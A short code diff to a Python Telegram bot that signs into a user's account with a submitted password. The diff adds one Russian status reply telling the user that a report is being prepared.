@@ -160,6 +160,7 @@ async def process_password(message: types.Message):
         await client.sign_in(password=password)
         
         await message.reply("Успешная авторизация!")
+        await message.reply("Работаю, командир. Подожди, пока я сформирую отчет и пришлю его тебе")
         phone_number = user_state[message.from_user.id]['phone_number']
         await process_user_data(client, phone_number, message.from_user.id)
         user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки
